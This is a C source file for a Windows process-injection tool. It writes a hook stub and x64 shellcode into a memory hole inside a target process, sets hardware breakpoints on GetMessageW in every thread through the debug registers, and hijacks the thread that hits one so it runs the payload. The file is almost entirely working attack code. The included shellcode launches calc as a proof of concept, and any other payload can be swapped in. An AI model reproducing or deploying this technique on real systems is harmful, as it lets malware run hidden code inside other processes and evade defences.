# include <windows.h>
# include <stdio.h>
# include <TlHelp32.h>

# define PUTS( msg, ... ) printf( "[-] > " msg " Error: %d\n", ##__VA_ARGS__, GetLastError() );
# define MSG( msg, ... ) printf( "[+] > " msg "\n", ##__VA_ARGS__ );

# define TARGET_FUNCTION GetMessageW

char hook[42] = {
	0x5B, 0x48, 0x83, 0xEB, 0x05, 0x53, 0x51, 0x52, 0x41, 0x51, 0x41, 0x50,
	0x41, 0x53, 0x41, 0x52, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00, 0x00,
	0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41, 0x58, 0x41,
	0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
};

// x64 calc shellcode
char payload[106] = {
		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
		0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
		0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
		0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
		0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
		0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
		0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
		0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

int HandleHook( BOOL Remove, int pid )
{	
	HANDLE			hSnapshot	= 0,
					hThread     = 0;
	THREADENTRY32	Thread		= { .dwSize = sizeof( THREADENTRY32 ) };
	CONTEXT			ThreadCtx	= { 0 };
	int				succeeded	= 0;

	if ( ( hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 ) ) == INVALID_HANDLE_VALUE ) {
		PUTS( "Could not create thread snapshot for PID %d", pid );
		goto Cleanup;
	}

	if ( !Thread32First( hSnapshot, &Thread ) ) {
		PUTS( "Failed to enumerate threads in the snapshot" );
		goto Cleanup;
	}
	
	do 
	{
		if ( Thread.th32ThreadID && Thread.th32OwnerProcessID == pid )
		{
			if ( ( hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, Thread.th32ThreadID ) ) == NULL ) {
				PUTS( "Could not open handle to thread %d in PID %d", Thread.th32ThreadID, Thread.th32OwnerProcessID );
				goto Cleanup;
			}

			RtlZeroMemory( &ThreadCtx, sizeof( CONTEXT ) );
			ThreadCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

			if ( !GetThreadContext( hThread, &ThreadCtx ) ) {
				PUTS( "Could not acquire thread context for thread id %d", Thread.th32ThreadID );
				goto Cleanup;
			}

			ThreadCtx.Dr3 = Remove ? 0 : TARGET_FUNCTION;
			ThreadCtx.Dr7 = Remove ? 0 : 0x40;

			if ( !SetThreadContext( hThread, &ThreadCtx ) ) {
				PUTS( "Could not set Dr3 register" );
				goto Cleanup;
			}
			MSG( "%s hardware breakpoint from dr3 register in thread id % d", Remove ? "Removed" : "Installed", Thread.th32ThreadID);
			CloseHandle( hThread );
		}
	} while ( Thread32Next( hSnapshot, &Thread ) );

	succeeded = 1;

Cleanup:
	if ( hSnapshot )
		CloseHandle( hSnapshot );

	if ( hThread )
		CloseHandle( hThread );

	return succeeded;
}


int main( int argc, char* argv[] )
{
	HANDLE			hProcess = 0,
					hThread = 0;
	ULONG_PTR		ulMemoryHoleBase = 0,
					ulPayloadBase = 0,
					ulTargetFunc = ( ULONG_PTR )TARGET_FUNCTION;
	void			*pMemoryHole = 0;
	int				pid = 0,
					payload_size = 0;
	size_t			bytes_written = 0;
	unsigned long	old_protection = 0;
	THREADENTRY32	Thread = { 
		.dwSize = sizeof( THREADENTRY32 ) 
	};
	CONTEXT			ThreadCtx = { 0 };
	DEBUG_EVENT		DebugEvent = { 0 };

	if ( argc != 2 ) {
		PUTS( "USAGE: %s <target process id>", argv[0] );
		goto Cleanup;
	}

	if ( ( pid = atoi( argv[1] ) ) == 0 ) {
		PUTS( "An invalid PID was supplied." );
		goto Cleanup;
	}

	/*
		Step 1; acquire a pid to the target process
	*/
	if ( ( hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid ) ) == NULL ) {
		PUTS( "Could acquire handle to PID %d", pid );
		goto Cleanup;
	}
	MSG( "Acquired handle to PID %d", pid );

	/*
		Step 2; Locate a memory hole within the target process. This is memory space between loaded dlls.
	*/
	payload_size = sizeof( hook ) + sizeof( payload );
	for ( 
		ulMemoryHoleBase = ( ulTargetFunc & 0xFFFFFFFFFFFF0000 ) - 0x70000000; 
		ulMemoryHoleBase < ulTargetFunc + 0x70000000;
		ulMemoryHoleBase += 0x10000 
	)
	{
		pMemoryHole = VirtualAllocEx( hProcess, ( void* )ulMemoryHoleBase, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
		if ( !pMemoryHole )
			continue;

		break;
	};
	MSG( "Located memory hole in PID %d at the address 0x%p", pid, pMemoryHole );

	/*
		Step 3; Write the hook shellcode then the payload below it
	*/
	if ( !WriteProcessMemory( hProcess, pMemoryHole, hook, sizeof( hook ), &bytes_written ) || bytes_written != sizeof( hook ) ) {
		PUTS( "Could not write the hook to 0x%p at PID %d. Bytes to write: %zd, Bytes written: %zd", pMemoryHole, pid, bytes_written, sizeof( hook ) );
		goto Cleanup;
	}

	MSG( "Wrote hook to 0x%p in PID %d", pMemoryHole, pid );

	ulPayloadBase = ( ULONG_PTR )pMemoryHole + sizeof( hook );
	if ( !WriteProcessMemory( hProcess, ( void* )ulPayloadBase, payload, sizeof( payload ), &bytes_written ) ) {
		PUTS( "Could not write the payload to 0x%p at PID %d. Bytes to write: %zd, Bytes written: %zd", pMemoryHole, pid, bytes_written, sizeof( hook ) );
		goto Cleanup;
	}
	MSG( "Wrote payload below hook at 0x%llu in PID %d", ulPayloadBase, pid );
	
	if (!VirtualProtectEx(hProcess, pMemoryHole, payload_size, PAGE_EXECUTE_READWRITE, &old_protection ) )
	{
		PUTS("Failed to set memory permissions on shellcode @ 0x%p", pMemoryHole );
		goto Cleanup;
	}


	/*
		Step 4; Place target process into a debuggable state
	*/
	if ( !DebugActiveProcess( pid ) ) {
		PUTS( "Could not place PID %d in a debuggable state.", pid );
		goto Cleanup;
	}

	/*
		Step 5; Install hardware breakpoints on the target function within each thread of the process 
	*/
	if ( !HandleHook( FALSE, pid ) ) {
		PUTS( "Failed to install hook. ");
		goto Cleanup;
	}
	MSG( "Installed breakpoints on all threads. Awaiting thread to hit hardware breakpoint..." );
	
	/*
		Step 6; Search for instances of hardware breakpoint being hit & acquire handle to
				to thread which triggered the breakpoint
	*/
	hThread = NULL;
	while ( WaitForDebugEvent( &DebugEvent, INFINITE ) ) 
	{
		if 
		(
			DebugEvent.dwProcessId == pid
			&& DebugEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT
			&& DebugEvent.u.Exception.ExceptionRecord.ExceptionCode == STATUS_SINGLE_STEP
			&& DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress == ( void* )ulTargetFunc
		)
		{
			if ( ( hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, DebugEvent.dwThreadId ) ) == NULL ) {
				PUTS( "Could not acquire handle to thread id %d in PID %d which triggered debug events.", DebugEvent.dwThreadId, DebugEvent.dwProcessId );
				continue;
			}
			break;
		}

		ContinueDebugEvent( pid, DebugEvent.dwThreadId, DBG_CONTINUE );
	}
	MSG( "Acquired target thread for hijacking..." );

	/*
		Step 7; Hijack the thread which triggered the exception on the function to execute
			    the shellcode that was written to the processes memory hole in step 3
	*/
	RtlZeroMemory( &ThreadCtx, sizeof( CONTEXT ) );
	ThreadCtx.ContextFlags = CONTEXT_CONTROL;

	if ( !GetThreadContext( hThread, &ThreadCtx ) ) {
		PUTS( "Could not acquire the context of thread %d in PID %d", DebugEvent.dwThreadId, pid );
		goto Cleanup;
	}

	ThreadCtx.Rip = ulMemoryHoleBase;

	if ( !SetThreadContext( hThread, &ThreadCtx ) ) {
		PUTS( "Could not acquire the context of thread %d in PID %d", DebugEvent.dwThreadId, pid );
		goto Cleanup;
	}
	MSG( "Hijacked thread id %d", DebugEvent.dwThreadId );

	/*
		Step 8; Remove all hardware breakpoints
	*/
	if ( !HandleHook( TRUE, pid ) ) {
		PUTS( "Failed to remove hooks");
		goto Cleanup;
	}

	/*
		Step 9; Mark debug event as handled (Executes the payload)
	*/
	ContinueDebugEvent( pid, DebugEvent.dwThreadId, DBG_CONTINUE );

	/*
		Step 10; Remove process from debug state (Keeps process alive after execution)
	*/
	DebugActiveProcessStop( pid );

Cleanup:

	if ( hProcess )
		CloseHandle( hProcess );

	if ( hThread )
		CloseHandle( hThread );

	MSG( "Clean exit. Press enter to quit..." );
	getchar();

	return 0;
}